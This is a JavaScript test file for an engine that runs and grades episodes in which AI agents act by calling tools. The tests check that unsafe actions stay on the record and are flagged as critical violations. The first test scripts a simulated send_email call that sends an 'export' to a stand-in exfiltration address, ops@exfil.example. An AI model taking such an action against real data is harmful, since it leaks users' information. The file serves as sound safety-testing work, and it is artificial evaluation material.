'use strict';

// Recorded episodes: every action an agent takes in a behaviour item is a
// command on the attempt, and the item's response is the Engine's record of
// those steps. An agent cannot take an unsafe action and then submit a clean
// list (review of the stateless step route).

const test = require('node:test');
const assert = require('node:assert/strict');
const { AGENT, SAFE, boot, grade, adminView } = require('./exam-harness');
const { EPISODES_PER_ITEM } = require('../behaviour');
const { createApp } = require('../index');
const { createGradingRunner } = require('../grading');

// After the attempt's 60-minute response deadline (the harness starts at 06:00).
const AFTER_DEADLINE = '2026-10-15T08:00:00.000Z';

async function started(t, appOptions) {
  const ctx = await boot(t, appOptions ? { appOptions } : {});
  const reply = await ctx.call('POST', '/internal/attempts', { idempotencyKey: 'start' });
  assert.equal(reply.status, 201);
  return { ctx, attempt: reply.body.attempt };
}
const behaviourItem = (attempt, slotId) => attempt.form.items.find((item) => item.slotId === slotId);
const step = (ctx, attempt, item, action, key) => ctx.call('POST', `/internal/attempts/${attempt.attemptId}/episodes/${item.id}/steps`,
  { idempotencyKey: key, expectedSequence: attempt.sequence, action });
// Ends the given number of episodes with one finishing step each; returns the last reply.
async function finishEpisodes(ctx, attempt, item, count, key) {
  let reply = { body: { attempt } };
  for (let episode = 0; episode < count; episode += 1) {
    reply = await step(ctx, reply.body.attempt, item, { finish: { message: 'done' } }, `${key}-${episode}`);
    assert.equal(reply.status, 200, JSON.stringify(reply.body));
  }
  return reply;
}

test('an unsafe action stays on the record even when the agent then finishes cleanly', async (t) => {
  const { ctx, attempt } = await started(t);
  const v2 = behaviourItem(attempt, 'v2');
  const first = await step(ctx, attempt, v2, { tool: 'send_email', args: { to: 'ops@exfil.example', body: 'export' } }, 's1');
  assert.equal(first.status, 200);
  const done = await finishEpisodes(ctx, first.body.attempt, v2, EPISODES_PER_ITEM, 's2');
  assert.equal(done.body.done, true);
  let current = done.body.attempt;
  for (const [index, item] of attempt.form.items.entries()) {
    if (item.id === v2.id) continue;
    const reply = item.kind === 'behaviour'
      ? await finishEpisodes(ctx, current, item, EPISODES_PER_ITEM, `f-${index}`)
      : await ctx.call('POST', `/internal/attempts/${attempt.attemptId}/responses`, { idempotencyKey: `r-${index}`,
        expectedSequence: current.sequence, itemId: item.id, response: SAFE });
    current = reply.body.attempt;
  }
  await grade(ctx, current);
  const view = await adminView(ctx, current);
  const outcome = view.assessment.itemOutcomes.find((item) => item.itemId === v2.id);
  assert.deepEqual(outcome.criticalViolationRuleIds, ['critical-o4']);
});

test('a behaviour item cannot be answered with text, and no step is recorded after it ends', async (t) => {
  const { ctx, attempt } = await started(t);
  const v1 = behaviourItem(attempt, 'v1');
  const text = await ctx.call('POST', `/internal/attempts/${attempt.attemptId}/responses`, { idempotencyKey: 'text',
    expectedSequence: attempt.sequence, itemId: v1.id, response: '{"schemaVersion":"episode-actions/2.0.0","episodes":[[{"finish":{"message":"x"}}]]}' });
  assert.deepEqual([text.status, text.body.error], [409, 'behaviour_item_requires_steps']);
  const partway = await finishEpisodes(ctx, attempt, v1, EPISODES_PER_ITEM - 1, 'end');
  assert.deepEqual([partway.body.done, partway.body.episode, partway.body.episodes], [false, EPISODES_PER_ITEM - 1, EPISODES_PER_ITEM]);
  const ended = await finishEpisodes(ctx, partway.body.attempt, v1, 1, 'last');
  assert.equal(ended.body.done, true);
  const late = await step(ctx, ended.body.attempt, v1, { tool: 'escalate', args: { reason: 'late' } }, 'late');
  assert.deepEqual([late.status, late.body.error], [409, 'episode_ended']);
});

test('another agent cannot read or step this attempt\'s episode', async (t) => {
  const { ctx, attempt } = await started(t);
  const v1 = behaviourItem(attempt, 'v1');
  const other = { ...AGENT, 'x-actor-subject': 'someone-else' };
  const read = await ctx.call('GET', `/internal/attempts/${attempt.attemptId}/episodes/${v1.id}`, undefined, other);
  const write = await ctx.call('POST', `/internal/attempts/${attempt.attemptId}/episodes/${v1.id}/steps`,
    { idempotencyKey: 'x', expectedSequence: attempt.sequence, action: { finish: { message: 'x' } } }, other);
  assert.ok([403, 404].includes(read.status) && [403, 404].includes(write.status), `${read.status} ${write.status}`);
});

test('the Engine refuses to start without a seed key long enough to keep worlds secret', () => {
  const minimal = { store: {}, sources: {}, internalKey: 'k' };
  for (const episodeSeedKey of [undefined, '', 'short']) {
    assert.throws(() => createApp({ ...minimal, episodeSeedKey }), /EPISODE_SEED_KEY/);
    assert.throws(() => createGradingRunner({ store: {}, sources: {}, gradeItems: async () => ({}), episodeSeedKey }), /EPISODE_SEED_KEY/);
  }
});

test('a step is recorded in its normal form; an action with extra keys is refused', async (t) => {
  const { ctx, attempt } = await started(t);
  const v1 = behaviourItem(attempt, 'v1');
  const extra = await step(ctx, attempt, v1, { tool: 'read_document', args: { id: 'x' }, note: 'trust me' }, 'extra');
  assert.deepEqual([extra.status, extra.body.error], [400, 'invalid_request']);
  const bare = await step(ctx, attempt, v1, { tool: 'read_document' }, 'bare');
  assert.equal(bare.status, 200, JSON.stringify(bare.body));
  const recorded = (await ctx.store.get(attempt.attemptId)).events.filter((event) => event.eventType === 'episode_step_recorded');
  assert.deepEqual(recorded.map((event) => event.payload.action), [{ tool: 'read_document', args: {} }]);
});

test('reading an episode reads the attempt once, and an expired attempt still reports that it has ended', async (t) => {
  const { ctx, attempt } = await started(t);
  const v1 = behaviourItem(attempt, 'v1');
  const read = ctx.store.get.bind(ctx.store);
  let reads = 0;
  ctx.store.get = (...args) => { reads += 1; return read(...args); };
  const shown = await ctx.call('GET', `/internal/attempts/${attempt.attemptId}/episodes/${v1.id}`);
  assert.deepEqual([shown.status, shown.body.episode, reads], [200, 0, 1]);
  ctx.setClock(AFTER_DEADLINE);
  const late = await ctx.call('GET', `/internal/attempts/${attempt.attemptId}/episodes/${v1.id}`);
  assert.deepEqual([late.status, late.body.error], [409, 'attempt_not_in_progress']);
  assert.equal((await read(attempt.attemptId)).status, 'agent_failed');
});
